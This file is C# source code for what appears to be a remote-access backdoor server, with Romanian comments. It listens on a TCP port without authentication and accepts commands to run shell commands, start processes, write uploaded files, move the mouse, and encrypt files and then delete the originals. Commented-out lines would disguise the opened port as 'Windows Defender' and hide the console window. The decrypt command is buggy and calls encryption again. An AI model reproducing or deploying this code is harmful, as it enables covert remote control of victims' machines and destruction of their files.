using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Net;
using System.Text;
using System.Runtime.InteropServices;
using System.IO;

namespace Server
{
    class Server
    {
        [DllImport("user32.dll")]
        static extern bool SetCursorPos(int X, int Y);
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        static int port = 12750;
        static bool running;
        static Socket socket;
        static int receiveBuffer = 8192;
        static int sendBuffer = 8192;
        static int sendTimeout = 30000;

        static void Main(string[] args)
        {

            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

            try
            {
                //Utils.OpenPort(Open.Nat.Protocol.Tcp, port, port, "Windows Defender").Wait();
                //ShowWindow(GetConsoleWindow(), 5); //0 - invizibil; 5 - vizibil
            }
            catch
            {
                Console.WriteLine($"Failed to open port {port}.");
            }

            socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            socket.Bind(new IPEndPoint(0, port));
            socket.Listen(100);

            running = true;
            while (running)
            {
                Socket accepted = socket.Accept();
                accepted.ReceiveBufferSize = receiveBuffer;
                accepted.SendBufferSize = sendBuffer;
                accepted.SendTimeout = sendTimeout;

                NetworkStream networkStream = new NetworkStream(accepted);
                BinaryWriter binaryWriter = new BinaryWriter(networkStream);
                BinaryReader binaryReader = new BinaryReader(networkStream);

                byte[] buffer = new byte[receiveBuffer]; //aici dadea eroare
                binaryReader.Read(buffer);
                buffer = Utils.TrimBytes(buffer);
                string result = Encoding.ASCII.GetString(buffer);
                List<string> commandArgs = result.Split(' ').ToList();

                try
                {
                    //momentan inutil pt ca primul socket nu citeste stream-ul
                    if (result == "connected")
                        SendMessage(binaryWriter, "Connection established.");

                    //remotereceivebuffer
                    else if(commandArgs[0] == "remoteReceiveBuffer")
                    {
                        if (commandArgs.Count >= 2)
                        {
                            Int32.TryParse(commandArgs[1], out receiveBuffer);
                            SendMessage(binaryWriter, $"Server receive buffer size set to {receiveBuffer}.");
                        }
                        else
                            SendMessage(binaryWriter, $"Server receive buffer size is {receiveBuffer}.");
                    }

                    //remotesendbuffer
                    else if (commandArgs[0] == "remoteSendBuffer")
                    {
                        if (commandArgs.Count >= 2)
                        {
                            Int32.TryParse(commandArgs[1], out sendBuffer);
                            SendMessage(binaryWriter, $"Server send buffer size set to {sendBuffer}.");
                        }
                        else
                            SendMessage(binaryWriter, $"Server send buffer size is {sendBuffer}.");
                    }

                    //remotesendtimeout
                    else if (commandArgs[0] == "remoteSendTimeout")
                    {
                        if (commandArgs.Count >= 2)
                        {
                            Int32.TryParse(commandArgs[1], out sendTimeout);
                            SendMessage(binaryWriter, $"Server send timeout set to {sendTimeout}.");
                        }
                        else
                            SendMessage(binaryWriter, $"Server send timeout is {sendTimeout}.");
                    }

                    else if (commandArgs[0] == "send")
                    {
                        byte[] fileBytes = new byte[receiveBuffer];
                        binaryReader.Read(fileBytes);

                        File.WriteAllBytes(commandArgs[2], fileBytes);

                        SendMessage(binaryWriter, $"Successfully received file {commandArgs[3]}.");
                    }

                    //beep
                    else if (commandArgs[0] == "beep")
                    {
                        if (commandArgs.Count == 2)
                            Commands.Beep(Int32.Parse(commandArgs[1]));
                        else if (commandArgs.Count >= 3)
                            Commands.Beep(Int32.Parse(commandArgs[1]), Int32.Parse(commandArgs[2]));
                        else
                            Commands.Beep();
                        SendMessage(binaryWriter, "Beep executed successfully.");
                    }

                    //process
                    else if (commandArgs[0] == "process")
                    {
                        int processPid = Commands.StartProcess(commandArgs[1], commandArgs.Skip(2).ToArray());
                        SendMessage(binaryWriter, $"Successfully started process with PID {processPid}.");
                    }

                    //cmd
                    else if (commandArgs[0] == "cmd")
                    {
                        string output = Commands.ExecuteCMD(commandArgs.Skip(1).ToArray());
                        SendMessage(binaryWriter, $"OUTPUT: {output}");
                    }

                    //encrypt
                    else if (commandArgs[0] == "encrypt")
                    {
                        if (commandArgs.Count >= 4)
                        {
                            //ca sa aiba 8 biti
                            string actualPassword = Utils.GetMD5(commandArgs[3]).Substring(0, 8);
                            Commands.EncryptFile(commandArgs[1], commandArgs[2], actualPassword);
                            File.Delete(commandArgs[1]);
                        }
                        SendMessage(binaryWriter, $"Successfully encrypted file '{commandArgs[1]}'" +
                            $"into '{commandArgs[2]}' using password '{commandArgs[3]}'.");
                    }

                    else if (commandArgs[0] == "decrypt")
                    {
                        if (commandArgs.Count >= 4)
                        {
                            //ca sa aiba 8 biti
                            string actualPassword = Utils.GetMD5(commandArgs[3]).Substring(0, 8);
                            Commands.EncryptFile(commandArgs[1], commandArgs[2], actualPassword);
                            File.Delete(commandArgs[1]);
                        }
                        SendMessage(binaryWriter, $"Successfully decrypted file '{commandArgs[1]}'" +
                            $"into '{commandArgs[2]}' using password '{commandArgs[3]}'.");
                    }

                    //openport ==== DE TERMINAT
                    else if (commandArgs[0] == "openport")
                    {
                        
                    }

                    //mouse
                    else if (result.Split(' ')[0] == "mouse")
                    {
                        SetCursorPos(Int32.Parse(result.Split(' ')[1]), Int32.Parse(result.Split(' ')[2]));
                        SendMessage(binaryWriter, "Command executed successfully.");
                    }

                    else
                        SendMessage(binaryWriter, "Invalid command.");
                }
                catch (Exception e)
                {
                    try
                    {
                        SendMessage(binaryWriter, $"SERVER ERROR: {e.Message}.");
                    }
                    catch
                    {
                        //sugi pula roby
                    }
                }

                networkStream.Close();
                binaryWriter.Close();
                binaryReader.Close();
                accepted.Shutdown(SocketShutdown.Both);
                accepted.Close();
            }
            socket.Shutdown(SocketShutdown.Both);
            socket.Close();
        }

        static void SendMessage(BinaryWriter writer, string input)
        {
            byte[] data = Encoding.ASCII.GetBytes(input);
            writer.Write(data);
        }
    }
}
